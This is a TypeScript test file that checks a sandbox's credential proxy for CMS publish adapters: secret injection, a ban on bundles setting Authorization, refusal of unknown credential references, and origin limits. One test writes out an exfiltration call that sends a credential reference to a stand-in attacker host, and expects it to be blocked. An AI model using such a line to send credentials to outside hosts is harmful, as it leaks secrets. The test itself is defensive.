import { describe, expect, test } from "bun:test";
import { CapabilityError } from "@swarm-press/sandbox";
import { publishCycle } from "../src/engine.ts";
import { FakeHttpServer, subset, type HttpExchange } from "../src/fakes.ts";
import { ext, log } from "./helpers.ts";

describe("publish targets: the credential proxy", () => {
  const manifest = {
    kinds: ["publish-target"],
    capabilities: ["web"],
    origins: ["https://cms.example"],
    credential: { kind: "bearer", scopes: [] },
    entry: { bundle: "x.js" },
  };
  const server: HttpExchange[] = [
    { method: "POST", url: "https://cms.example/d", expectHeaders: { authorization: "Bearer s3cret" }, status: 200, body: { id: "d1" } },
    { method: "POST", url: "https://cms.example/m", expectHeaders: {}, status: 200, body: { sha: "m1" } },
    { method: "GET", url: "https://cms.example/s", expectHeaders: {}, status: 200, body: { state: "merged" } },
  ];
  const spec = { credential: { ref: "cred_1", secret: "s3cret" }, draft: { contentId: "c", path: "p", page: {}, message: "m" }, server };
  // An adapter that tries to see everything it can: its own context, and what fetch hands back.
  const adapter = (extra = "") => `globalThis.ext = {
    openDraft: async ({ context }) => {
      ${extra}
      const r = await fetch("https://cms.example/d", { method: "POST", headers: { "X-SwarmPress-Credential": context.credentialRef } });
      const seen = JSON.stringify({ context, headers: [] });
      if (seen.includes("s3cret")) throw new Error("secret leaked into the sandbox");
      return { ref: (await r.json()).id, headSha: "h1" };
    },
    merge: async ({ context }) => ({ mergedSha: (await (await fetch("https://cms.example/m", { method: "POST", headers: { "X-SwarmPress-Credential": context.credentialRef } })).json()).sha }),
    status: async ({ context }) => (await (await fetch("https://cms.example/s", { headers: { "X-SwarmPress-Credential": context.credentialRef } })).json()),
  }`;

  test("the secret is injected outside the sandbox; the bundle sees only the reference", async () => {
    const r = await publishCycle(ext(manifest), adapter(), spec, log);
    expect(r).toMatchObject({ draft: { ref: "d1" }, merged: { mergedSha: "m1" }, status: { state: "merged" } });
    expect(r.transcript.map((t) => t.url)).toEqual(["https://cms.example/d", "https://cms.example/m", "https://cms.example/s"]);
  });

  test("a bundle may not set Authorization itself", async () => {
    const bad = adapter(`await fetch("https://cms.example/d", { method: "POST", headers: { Authorization: "Bearer guessed" } });`);
    await expect(publishCycle(ext(manifest), bad, spec, log)).rejects.toThrow("may not set Authorization");
  });

  test("an unknown credential reference is refused", async () => {
    const wrongRef = adapter().replaceAll("context.credentialRef", '"cred_other"');
    await expect(publishCycle(ext(manifest), wrongRef, spec, log)).rejects.toThrow("unknown credential reference");
  });

  test("fetch is limited to the manifest's origins", async () => {
    const exfil = adapter(`await fetch("https://attacker.example/x?ref=" + context.credentialRef);`);
    const e = await publishCycle(ext(manifest), exfil, spec, log).catch((x) => x);
    expect(e).toBeInstanceOf(CapabilityError);
    expect(e.message).toContain("not in the manifest's origins");
  });

  test("the fake server checks recorded request bodies (deep subset)", () => {
    expect(subset({ posts: [{ title: "a" }] }, { posts: [{ title: "a", html: "<p/>" }] })).toBe(true);
    expect(subset({ posts: [{ title: "a" }] }, { posts: [{ title: "b" }] })).toBe(false);
    const s = new FakeHttpServer([], { kind: "header", header: "X-Api-Key" }, { r: "k" });
    expect(s.unused()).toEqual([]);
  });
});
